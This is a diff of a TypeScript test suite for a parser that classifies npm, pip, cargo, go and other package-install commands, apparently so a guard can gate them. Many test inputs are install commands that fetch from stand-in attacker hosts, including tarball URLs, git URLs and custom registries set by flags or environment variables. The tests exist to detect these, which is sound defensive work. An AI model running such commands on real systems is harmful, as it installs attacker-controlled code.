@@ -1,4 +1,5 @@
 import { describe, expect, it } from "vitest";
+import { nonNull } from "../lib/non-null.js";
 import type { PackageSpec } from "./package-install-parser.js";
 import {
 	isExactPinnedVersion,
@@ -69,26 +70,26 @@ describe("parseInstallCommands — regression: shell redirections (2026-05-28 #1
 	it("npm install with `2>&1` no longer treats it as a package", () => {
 		const cmds = parseInstallCommands("npm install -g wrangler@latest 2>&1");
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "wrangler", version: "latest" }]);
+		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "wrangler", version: "latest" }]);
 	});
 
 	it("npm install with `> log` doesn't parse log as a package", () => {
 		const cmds = parseInstallCommands("npm install lodash > install.log");
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
+		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
 	});
 
 	it("npm install with `2>err.log` doesn't parse err.log as a package", () => {
 		const cmds = parseInstallCommands("npm install lodash 2>err.log");
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
+		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
 	});
 
 	it("compound command `npm install ... 2>&1 | tail` still parses the install correctly", () => {
 		const cmds = parseInstallCommands("npm install lodash 2>&1 | tail -15");
 		// tail isn't an install verb, so only the npm segment surfaces
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].packages).toEqual([{ kind: "registry", name: "lodash" }]);
+		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
 	});
 });
 
@@ -118,7 +119,7 @@ describe("splitShellSegments", () => {
 
 describe("parseInstallCommands — npm family", () => {
 	it("npm install <pkg> → add, single registry package", () => {
-		const [cmd] = parseInstallCommands("npm install lodash");
+		const cmd = nonNull(parseInstallCommands("npm install lodash")[0]);
 		expect(cmd.ecosystem).toBe("npm");
 		expect(cmd.manager).toBe("npm");
 		expect(cmd.action).toBe("add");
@@ -128,20 +129,20 @@ describe("parseInstallCommands — npm family", () => {
 	});
 
 	it("npm install with no args → sync from manifest", () => {
-		const [cmd] = parseInstallCommands("npm install");
+		const cmd = nonNull(parseInstallCommands("npm install")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromManifest).toBe(true);
 		expect(cmd.packages).toEqual([]);
 	});
 
 	it("npm ci → sync from lockfile", () => {
-		const [cmd] = parseInstallCommands("npm ci");
+		const cmd = nonNull(parseInstallCommands("npm ci")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("npm i shorthand", () => {
-		const [cmd] = parseInstallCommands("npm i react react-dom");
+		const cmd = nonNull(parseInstallCommands("npm i react react-dom")[0]);
 		expect(cmd.action).toBe("add");
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
 			"react",
@@ -150,13 +151,13 @@ describe("parseInstallCommands — npm family", () => {
 	});
 
 	it("npm install with @version", () => {
-		const [cmd] = parseInstallCommands("npm install lodash@4.17.21");
-		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "lodash", version: "4.17.21" });
+		const cmd = nonNull(parseInstallCommands("npm install lodash@4.17.21")[0]);
+		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "lodash", version: "4.17.21" });
 	});
 
 	it("npm install with scoped package", () => {
-		const [cmd] = parseInstallCommands("npm install @types/node@22.5.0");
-		expect(cmd.packages[0]).toEqual({
+		const cmd = nonNull(parseInstallCommands("npm install @types/node@22.5.0")[0]);
+		expect(nonNull(cmd.packages[0])).toEqual({
 			kind: "registry",
 			name: "@types/node",
 			version: "22.5.0",
@@ -164,63 +165,63 @@ describe("parseInstallCommands — npm family", () => {
 	});
 
 	it("npm install with bare scoped package (no version)", () => {
-		const [cmd] = parseInstallCommands("npm install @scope/lib");
-		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "@scope/lib" });
+		const cmd = nonNull(parseInstallCommands("npm install @scope/lib")[0]);
+		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "@scope/lib" });
 	});
 
 	it("npm install git URL → git_url spec", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"npm install git+https://github.com/attacker/evil.git",
-		);
-		expect(cmd.packages[0].kind).toBe("git_url");
+		)[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 
 	it("npm install tarball URL → tarball_url spec", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"npm install https://attacker.com/payload.tgz",
-		);
-		expect(cmd.packages[0].kind).toBe("tarball_url");
+		)[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("tarball_url");
 	});
 
 	it("npm install local path → local_path spec", () => {
-		const [cmd] = parseInstallCommands("npm install ./my-local-pkg");
-		expect(cmd.packages[0].kind).toBe("local_path");
+		const cmd = nonNull(parseInstallCommands("npm install ./my-local-pkg")[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
 	});
 
 	it("npm install --registry attacker.com captures customRegistry", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"npm install foo --registry http://attacker.com",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://attacker.com");
 	});
 
 	it("npm install --registry=URL form", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"npm install foo --registry=http://attacker.com",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://attacker.com");
 	});
 
 	it("pnpm install --frozen-lockfile → fromLockfile", () => {
-		const [cmd] = parseInstallCommands("pnpm install --frozen-lockfile");
+		const cmd = nonNull(parseInstallCommands("pnpm install --frozen-lockfile")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("yarn (no subcommand) → sync from manifest", () => {
-		const [cmd] = parseInstallCommands("yarn");
+		const cmd = nonNull(parseInstallCommands("yarn")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromManifest).toBe(true);
 	});
 
 	it("yarn add foo → add", () => {
-		const [cmd] = parseInstallCommands("yarn add foo");
+		const cmd = nonNull(parseInstallCommands("yarn add foo")[0]);
 		expect(cmd.action).toBe("add");
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "foo" }]);
 	});
 
 	it("bun add foo bar", () => {
-		const [cmd] = parseInstallCommands("bun add foo bar");
+		const cmd = nonNull(parseInstallCommands("bun add foo bar")[0]);
 		expect(cmd.manager).toBe("bun");
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
 			"foo",
@@ -229,21 +230,21 @@ describe("parseInstallCommands — npm family", () => {
 	});
 
 	it("npm uninstall → remove (no packages added)", () => {
-		const [cmd] = parseInstallCommands("npm uninstall lodash");
+		const cmd = nonNull(parseInstallCommands("npm uninstall lodash")[0]);
 		expect(cmd.action).toBe("remove");
 	});
 });
 
 describe("parseInstallCommands — pip family", () => {
 	it("pip install <pkg>", () => {
-		const [cmd] = parseInstallCommands("pip install requests");
+		const cmd = nonNull(parseInstallCommands("pip install requests")[0]);
 		expect(cmd.ecosystem).toBe("pypi");
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests" }]);
 	});
 
 	it("pip install with version specifier RETAINS the operator (finding: pin bypass)", () => {
-		const [cmd] = parseInstallCommands("pip install requests==22.32.5");
-		expect(cmd.packages[0]).toEqual({
+		const cmd = nonNull(parseInstallCommands("pip install requests==22.32.5")[0]);
+		expect(nonNull(cmd.packages[0])).toEqual({
 			kind: "registry",
 			name: "requests",
 			version: "==22.32.5", // operator kept so the pin check can see `==` vs a range
@@ -251,38 +252,38 @@ describe("parseInstallCommands — pip family", () => {
 	});
 
 	it("pip install -r requirements.txt → fromManifest with manifestFile", () => {
-		const [cmd] = parseInstallCommands("pip install -r requirements.txt");
+		const cmd = nonNull(parseInstallCommands("pip install -r requirements.txt")[0]);
 		expect(cmd.fromManifest).toBe(true);
 		expect(cmd.manifestFile).toBe("requirements.txt");
 	});
 
 	it("pip install --index-url URL captures customRegistry", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"pip install foo --index-url http://attacker.com",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://attacker.com");
 	});
 
 	it("pip install with extras [foo,bar] strips them from name", () => {
-		const [cmd] = parseInstallCommands("pip install requests[security]");
-		expect(cmd.packages[0]).toMatchObject({ kind: "registry", name: "requests" });
+		const cmd = nonNull(parseInstallCommands("pip install requests[security]")[0]);
+		expect(nonNull(cmd.packages[0])).toMatchObject({ kind: "registry", name: "requests" });
 	});
 
 	it("pip install git+URL → git_url spec", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"pip install git+https://github.com/attacker/evil",
-		);
-		expect(cmd.packages[0].kind).toBe("git_url");
+		)[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 
 	it("pip3 alias", () => {
-		const [cmd] = parseInstallCommands("pip3 install numpy");
+		const cmd = nonNull(parseInstallCommands("pip3 install numpy")[0]);
 		expect(cmd.manager).toBe("pip3");
 		expect(cmd.ecosystem).toBe("pypi");
 	});
 
 	it("pipx install → install_global", () => {
-		const [cmd] = parseInstallCommands("pipx install poetry");
+		const cmd = nonNull(parseInstallCommands("pipx install poetry")[0]);
 		expect(cmd.action).toBe("install_global");
 	});
 
@@ -290,12 +291,12 @@ describe("parseInstallCommands — pip family", () => {
 	// environment, not a package (finding 2026-06: `pipx inject black
 	// requests==2.31.0` treated `black` as an unpinned package and blocked).
 	it("pipx inject skips the venv target — only the injected specs are packages", () => {
-		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0");
+		const cmd = nonNull(parseInstallCommands("pipx inject black requests==2.31.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests", version: "==2.31.0" }]);
 	});
 
 	it("pipx inject with several specs keeps them all (venv alone is dropped)", () => {
-		const [cmd] = parseInstallCommands("pipx inject black requests==2.31.0 urllib3==2.2.0");
+		const cmd = nonNull(parseInstallCommands("pipx inject black requests==2.31.0 urllib3==2.2.0")[0]);
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual([
 			"requests",
 			"urllib3",
@@ -303,23 +304,23 @@ describe("parseInstallCommands — pip family", () => {
 	});
 
 	it("pipx inject with flags before the venv still drops exactly the venv", () => {
-		const [cmd] = parseInstallCommands("pipx inject --include-apps black requests==2.31.0");
+		const cmd = nonNull(parseInstallCommands("pipx inject --include-apps black requests==2.31.0")[0]);
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
 	});
 
 	it("pipx inject with NO package specs yields no packages (nothing to gate)", () => {
-		const [cmd] = parseInstallCommands("pipx inject black");
+		const cmd = nonNull(parseInstallCommands("pipx inject black")[0]);
 		expect(cmd.packages).toEqual([]);
 	});
 
 	it("pipx INSTALL keeps its first positional as the package (only inject skips)", () => {
-		const [cmd] = parseInstallCommands("pipx install black");
+		const cmd = nonNull(parseInstallCommands("pipx install black")[0]);
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["black"]);
 	});
 
 	it("a malicious spec in the inject list is still classified (the guard still sees it)", () => {
-		const [cmd] = parseInstallCommands("pipx inject black git+https://github.com/attacker/evil");
-		expect(cmd.packages[0].kind).toBe("git_url");
+		const cmd = nonNull(parseInstallCommands("pipx inject black git+https://github.com/attacker/evil")[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 });
 
@@ -329,43 +330,43 @@ describe("parseInstallCommands — pip family", () => {
 // flags and the signal was silently lost.
 describe("pip attached short-option values", () => {
 	it("`-rreqs.txt` is a manifest install, same as `-r reqs.txt`", () => {
-		const [cmd] = parseInstallCommands("pip install -rrequirements.txt");
+		const cmd = nonNull(parseInstallCommands("pip install -rrequirements.txt")[0]);
 		expect(cmd.manifestFile).toBe("requirements.txt");
 		expect(cmd.fromManifest).toBe(true);
 	});
 
 	it("`-rhttps://…` (remote requirements) is captured, not silently skipped", () => {
-		const [cmd] = parseInstallCommands("pip install -rhttps://evil.example/r.txt");
+		const cmd = nonNull(parseInstallCommands("pip install -rhttps://evil.example/r.txt")[0]);
 		expect(cmd.manifestFile).toBe("https://evil.example/r.txt");
 	});
 
 	it("`-ihttps://mirror` is a custom registry, same as `-i https://mirror`", () => {
-		const [cmd] = parseInstallCommands("pip install -ihttps://mirror.example/simple requests==2.31.0");
+		const cmd = nonNull(parseInstallCommands("pip install -ihttps://mirror.example/simple requests==2.31.0")[0]);
 		expect(cmd.customRegistry).toBe("https://mirror.example/simple");
 	});
 
 	it("`-egit+URL` is an editable git spec the guard classifies, same as `-e git+URL`", () => {
-		const [cmd] = parseInstallCommands("pip install -egit+https://github.com/attacker/evil");
-		expect(cmd.packages[0].kind).toBe("git_url");
+		const cmd = nonNull(parseInstallCommands("pip install -egit+https://github.com/attacker/evil")[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 
 	it("`-cconstraints.txt` marks constraints without inventing a package", () => {
-		const [cmd] = parseInstallCommands("pip install -cconstraints.txt requests==2.31.0");
+		const cmd = nonNull(parseInstallCommands("pip install -cconstraints.txt requests==2.31.0")[0]);
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
 	});
 
 	it("separated forms are unchanged (`-r reqs.txt`, `-i URL`, `-e spec`)", () => {
-		const [withR] = parseInstallCommands("pip install -r requirements.txt");
+		const withR = nonNull(parseInstallCommands("pip install -r requirements.txt")[0]);
 		expect(withR.manifestFile).toBe("requirements.txt");
-		const [withI] = parseInstallCommands("pip install -i https://mirror.example/simple requests==2.31.0");
+		const withI = nonNull(parseInstallCommands("pip install -i https://mirror.example/simple requests==2.31.0")[0]);
 		expect(withI.customRegistry).toBe("https://mirror.example/simple");
-		const [withE] = parseInstallCommands("pip install -e git+https://github.com/attacker/evil");
-		expect(withE.packages[0].kind).toBe("git_url");
+		const withE = nonNull(parseInstallCommands("pip install -e git+https://github.com/attacker/evil")[0]);
+		expect(nonNull(withE.packages[0]).kind).toBe("git_url");
 	});
 
 	it("unrelated short flags with attached text are not misread as r/i/c/e values", () => {
 		// `-q`-style flags carry no value; a flag like `-U` (upgrade) must not match.
-		const [cmd] = parseInstallCommands("pip install -U requests==2.31.0");
+		const cmd = nonNull(parseInstallCommands("pip install -U requests==2.31.0")[0]);
 		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
 		expect(cmd.manifestFile).toBeUndefined();
 	});
@@ -377,8 +378,8 @@ describe("pip attached short-option values", () => {
 // bare name are NOT — they previously slipped through as exact `2.31.0`.
 describe("pip exact-pin round-trip (parse → pinnedVersionViolation)", () => {
 	function isExactPin(spec: string): boolean {
-		const [cmd] = parseInstallCommands(`pip install ${spec}`);
-		return pinnedVersionViolation(cmd.packages[0], "pypi") === null;
+		const cmd = nonNull(parseInstallCommands(`pip install ${spec}`)[0]);
+		return pinnedVersionViolation(nonNull(cmd.packages[0]), "pypi") === null;
 	}
 
 	it.each([
@@ -397,112 +398,112 @@ describe("pip exact-pin round-trip (parse → pinnedVersionViolation)", () => {
 
 describe("parseInstallCommands — poetry / uv", () => {
 	it("poetry add foo", () => {
-		const [cmd] = parseInstallCommands("poetry add fastapi");
+		const cmd = nonNull(parseInstallCommands("poetry add fastapi")[0]);
 		expect(cmd.ecosystem).toBe("pypi");
 		expect(cmd.action).toBe("add");
 	});
 
 	it("poetry install → sync from manifest", () => {
-		const [cmd] = parseInstallCommands("poetry install");
+		const cmd = nonNull(parseInstallCommands("poetry install")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromManifest).toBe(true);
 	});
 
 	it("poetry install --no-update → fromLockfile", () => {
-		const [cmd] = parseInstallCommands("poetry install --no-update");
+		const cmd = nonNull(parseInstallCommands("poetry install --no-update")[0]);
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("uv add foo", () => {
-		const [cmd] = parseInstallCommands("uv add httpx");
+		const cmd = nonNull(parseInstallCommands("uv add httpx")[0]);
 		expect(cmd.manager).toBe("uv");
 		expect(cmd.action).toBe("add");
 	});
 
 	it("uv sync --frozen → sync from lockfile", () => {
-		const [cmd] = parseInstallCommands("uv sync --frozen");
+		const cmd = nonNull(parseInstallCommands("uv sync --frozen")[0]);
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("uv pip install foo delegates to pip parser", () => {
-		const [cmd] = parseInstallCommands("uv pip install requests");
+		const cmd = nonNull(parseInstallCommands("uv pip install requests")[0]);
 		expect(cmd.ecosystem).toBe("pypi");
 		expect(cmd.action).toBe("add");
 	});
 
 	it("uv tool install → install_global", () => {
-		const [cmd] = parseInstallCommands("uv tool install black");
+		const cmd = nonNull(parseInstallCommands("uv tool install black")[0]);
 		expect(cmd.action).toBe("install_global");
 	});
 });
 
 describe("parseInstallCommands — cargo", () => {
 	it("cargo add foo", () => {
-		const [cmd] = parseInstallCommands("cargo add serde");
+		const cmd = nonNull(parseInstallCommands("cargo add serde")[0]);
 		expect(cmd.ecosystem).toBe("cargo");
 		expect(cmd.action).toBe("add");
 	});
 
 	it("cargo install foo → install_global", () => {
-		const [cmd] = parseInstallCommands("cargo install ripgrep");
+		const cmd = nonNull(parseInstallCommands("cargo install ripgrep")[0]);
 		expect(cmd.action).toBe("install_global");
 	});
 
 	it("cargo build --locked → fromLockfile sync", () => {
-		const [cmd] = parseInstallCommands("cargo build --locked");
+		const cmd = nonNull(parseInstallCommands("cargo build --locked")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("cargo add --git URL captures git URL", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"cargo add --git https://github.com/foo/bar foo",
-		);
+		)[0]);
 		expect(cmd.packages.some((p) => p.kind === "git_url")).toBe(true);
 	});
 });
 
 describe("parseInstallCommands — gem / bundle", () => {
 	it("gem install foo → install_global", () => {
-		const [cmd] = parseInstallCommands("gem install rails");
+		const cmd = nonNull(parseInstallCommands("gem install rails")[0]);
 		expect(cmd.ecosystem).toBe("rubygems");
 		expect(cmd.action).toBe("install_global");
 	});
 
 	it("bundle install → sync from manifest", () => {
-		const [cmd] = parseInstallCommands("bundle install");
+		const cmd = nonNull(parseInstallCommands("bundle install")[0]);
 		expect(cmd.action).toBe("sync");
 		expect(cmd.fromManifest).toBe(true);
 	});
 
 	it("bundle install --frozen → fromLockfile", () => {
-		const [cmd] = parseInstallCommands("bundle install --frozen");
+		const cmd = nonNull(parseInstallCommands("bundle install --frozen")[0]);
 		expect(cmd.fromLockfile).toBe(true);
 	});
 
 	it("bundle add foo → add", () => {
-		const [cmd] = parseInstallCommands("bundle add rails");
+		const cmd = nonNull(parseInstallCommands("bundle add rails")[0]);
 		expect(cmd.action).toBe("add");
 	});
 });
 
 describe("parseInstallCommands — go", () => {
 	it("go get module → add", () => {
-		const [cmd] = parseInstallCommands("go get github.com/gin-gonic/gin");
+		const cmd = nonNull(parseInstallCommands("go get github.com/gin-gonic/gin")[0]);
 		expect(cmd.ecosystem).toBe("go");
 		expect(cmd.action).toBe("add");
-		expect(cmd.packages[0]).toEqual({
+		expect(nonNull(cmd.packages[0])).toEqual({
 			kind: "registry",
 			name: "github.com/gin-gonic/gin",
 		});
 	});
 
 	it("go install → install_global", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"go install github.com/spf13/cobra-cli@latest",
-		);
+		)[0]);
 		expect(cmd.action).toBe("install_global");
-		expect(cmd.packages[0]).toEqual({
+		expect(nonNull(cmd.packages[0])).toEqual({
 			kind: "registry",
 			name: "github.com/spf13/cobra-cli",
 			version: "latest",
@@ -512,88 +513,88 @@ describe("parseInstallCommands — go", () => {
 
 describe("parseInstallCommands — env-var registry overrides (P1.1)", () => {
 	it("`NPM_CONFIG_REGISTRY=URL npm install foo` captures customRegistry", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"NPM_CONFIG_REGISTRY=http://attacker.com npm install lodash",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://attacker.com");
 	});
 
 	it("lowercase npm_config_registry is also detected (npm reads both)", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"npm_config_registry=http://evil npm install foo",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://evil");
 	});
 
 	it("`PIP_INDEX_URL=URL pip install requests` captures customRegistry", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"PIP_INDEX_URL=http://attacker.com pip install requests",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://attacker.com");
 	});
 
 	it("`env NPM_CONFIG_REGISTRY=URL npm install` form", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"env NPM_CONFIG_REGISTRY=http://evil npm install foo",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://evil");
 	});
 
 	it("YARN_REGISTRY=URL yarn add foo", () => {
-		const [cmd] = parseInstallCommands("YARN_REGISTRY=http://x yarn add foo");
+		const cmd = nonNull(parseInstallCommands("YARN_REGISTRY=http://x yarn add foo")[0]);
 		expect(cmd.customRegistry).toBe("http://x");
 	});
 
 	it("BUN_CONFIG_REGISTRY=URL bun add foo", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"BUN_CONFIG_REGISTRY=http://x bun add foo",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://x");
 	});
 
 	it("UV_INDEX_URL=URL uv pip install foo", () => {
-		const [cmd] = parseInstallCommands("UV_INDEX_URL=http://x uv pip install foo");
+		const cmd = nonNull(parseInstallCommands("UV_INDEX_URL=http://x uv pip install foo")[0]);
 		expect(cmd.customRegistry).toBe("http://x");
 	});
 
 	it("CARGO_REGISTRIES_FOO_INDEX=URL cargo add bar", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"CARGO_REGISTRIES_EVIL_INDEX=http://x cargo add bar",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://x");
 	});
 
 	it("Non-registry env var (DEBUG=1) does not set customRegistry", () => {
-		const [cmd] = parseInstallCommands("DEBUG=1 npm install lodash");
+		const cmd = nonNull(parseInstallCommands("DEBUG=1 npm install lodash")[0]);
 		expect(cmd.customRegistry).toBeUndefined();
 	});
 
 	it("Inline flag still wins over env var if both are present", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"NPM_CONFIG_REGISTRY=http://env npm install foo --registry http://cli",
-		);
+		)[0]);
 		expect(cmd.customRegistry).toBe("http://cli");
 	});
 });
 
 describe("parseInstallCommands — pre-verb flags (P1.2)", () => {
 	it("`npm --prefix app install evil` parses install verb correctly", () => {
-		const [cmd] = parseInstallCommands("npm --prefix app install evil");
+		const cmd = nonNull(parseInstallCommands("npm --prefix app install evil")[0]);
 		expect(cmd).toBeDefined();
 		expect(cmd.action).toBe("add");
-		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
+		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
 	});
 
 	it("`pnpm --filter app add evil`", () => {
-		const [cmd] = parseInstallCommands("pnpm --filter app add evil");
+		const cmd = nonNull(parseInstallCommands("pnpm --filter app add evil")[0]);
 		expect(cmd.action).toBe("add");
-		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
+		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
 	});
 
 	it("`yarn workspace app add evil`", () => {
-		const [cmd] = parseInstallCommands("yarn workspace app add evil");
+		const cmd = nonNull(parseInstallCommands("yarn workspace app add evil")[0]);
 		expect(cmd.action).toBe("add");
-		expect(cmd.packages[0]).toEqual({ kind: "registry", name: "evil" });
+		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
 	});
 
 	it("`yarn workspaces foreach run build` is not an install", () => {
@@ -603,48 +604,48 @@ describe("parseInstallCommands — pre-verb flags (P1.2)", () => {
 
 describe("parseInstallCommands — pip editable (P1.3)", () => {
 	it("`pip install -e git+URL` keeps the git URL as the spec", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"pip install -e git+https://attacker.com/evil",
-		);
+		)[0]);
 		expect(cmd.packages).toHaveLength(1);
-		expect(cmd.packages[0].kind).toBe("git_url");
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 
 	it("`pip install --editable git+URL` keeps the git URL", () => {
-		const [cmd] = parseInstallCommands(
+		const cmd = nonNull(parseInstallCommands(
 			"pip install --editable git+https://attacker.com/evil",
-		);
+		)[0]);
 		expect(cmd.packages).toHaveLength(1);
-		expect(cmd.packages[0].kind).toBe("git_url");
+		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
 	});
 
 	it("`pip install -e ./local` keeps local path", () => {
-		const [cmd] = parseInstallCommands("pip install -e ./local");
-		expect(cmd.packages[0].kind).toBe("local_path");
+		const cmd = nonNull(parseInstallCommands("pip install -e ./local")[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
 	});
 
 	it("`pip install -e .` (current dir, common editable form)", () => {
-		const [cmd] = parseInstallCommands("pip install -e .");
-		expect(cmd.packages[0].kind).toBe("local_path");
+		const cmd = nonNull(parseInstallCommands("pip install -e .")[0]);
+		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
 	});
 });
 
 describe("parseInstallCommands — effective cwd (P1.4)", () => {
 	it("standalone install has no effectiveCwd shift", () => {
-		const [cmd] = parseInstallCommands("npm install foo");
+		const cmd = nonNull(parseInstallCommands("npm install foo")[0]);
 		expect(cmd.effectiveCwd).toBeUndefined();
 	});
 
 	it("`cd packages/app && npm ci` attaches packages/app as effectiveCwd", () => {
 		const cmds = parseInstallCommands("cd packages/app && npm ci");
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].effectiveCwd).toBe("packages/app");
+		expect(nonNull(cmds[0]).effectiveCwd).toBe("packages/app");
 	});
 
 	it("two cd hops compose", () => {
 		const cmds = parseInstallCommands("cd packages && cd app && npm ci");
 		expect(cmds).toHaveLength(1);
-		expect(cmds[0].effectiveCwd).toBe("packages/app");
+		expect(nonNull(cmds[0]).effectiveCwd).toBe("packages/app");
 	});
 
 	it("each install sees its own cwd", () => {
@@ -652,13 +653,13 @@ describe("parseInstallCommands — effective cwd (P1.4)", () => {
 			"cd a && npm ci && cd ../b && npm ci",
 		);
 		expect(cmds).toHaveLength(2);
-		expect(cmds[0].effectiveCwd).toBe("a");
-		expect(cmds[1].effectiveCwd).toBe("a/../b");
+		expect(nonNull(cmds[0]).effectiveCwd).toBe("a");
+		expect(nonNull(cmds[1]).effectiveCwd).toBe("a/../b");
 	});
 
 	it("absolute cd resets to that absolute path", () => {
 		const cmds = parseInstallCommands("cd /abs/foo && npm install bar");
-		expect(cmds[0].effectiveCwd).toBe("/abs/foo");
+		expect(nonNull(cmds[0]).effectiveCwd).toBe("/abs/foo");
 	});
 });
 
@@ -673,18 +674,18 @@ describe("parseInstallCommands — compound and noise", () => {
 	it("compound command returns each segment", () => {
 		const cmds = parseInstallCommands("cd app && npm install lodash && pip install requests");
 		expect(cmds).toHaveLength(2);
-		expect(cmds[0].manager).toBe("npm");
-		expect(cmds[1].manager).toBe("pip");
+		expect(nonNull(cmds[0]).manager).toBe("npm");
+		expect(nonNull(cmds[1]).manager).toBe("pip");
 	});
 
 	it("sudo / env prefix is stripped", () => {
-		const [cmd] = parseInstallCommands("sudo npm install -g typescript");
+		const cmd = nonNull(parseInstallCommands("sudo npm install -g typescript")[0]);
 		expect(cmd.manager).toBe("npm");
 		expect(cmd.action).toBe("add");
 	});
 
 	it("DEBUG=1 env prefix stripped", () => {
-		const [cmd] = parseInstallCommands("DEBUG=1 pip install requests");
+		const cmd = nonNull(parseInstallCommands("DEBUG=1 pip install requests")[0]);
 		expect(cmd.manager).toBe("pip");
 	});
 
@@ -699,41 +700,41 @@ describe("parseInstallCommands — compound and noise", () => {
 // separate-flag pin forms that previously dropped the version on the floor.
 describe("parseInstallCommands — version pins land in spec.version", () => {
 	it("cargo add crate@1.0.0 → version on the spec (not a 2nd crate)", () => {
-		const [cmd] = parseInstallCommands("cargo add serde@1.0.0");
+		const cmd = nonNull(parseInstallCommands("cargo add serde@1.0.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
 	});
 
 	it("cargo add --vers 1.0.0 → version captured, no phantom package", () => {
-		const [cmd] = parseInstallCommands("cargo add serde --vers 1.0.0");
+		const cmd = nonNull(parseInstallCommands("cargo add serde --vers 1.0.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
 	});
 
 	it("cargo add --version=1.0.0 (glued flag) → version captured", () => {
-		const [cmd] = parseInstallCommands("cargo add serde --version=1.0.0");
+		const cmd = nonNull(parseInstallCommands("cargo add serde --version=1.0.0")[0]);
 		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
 	});
 
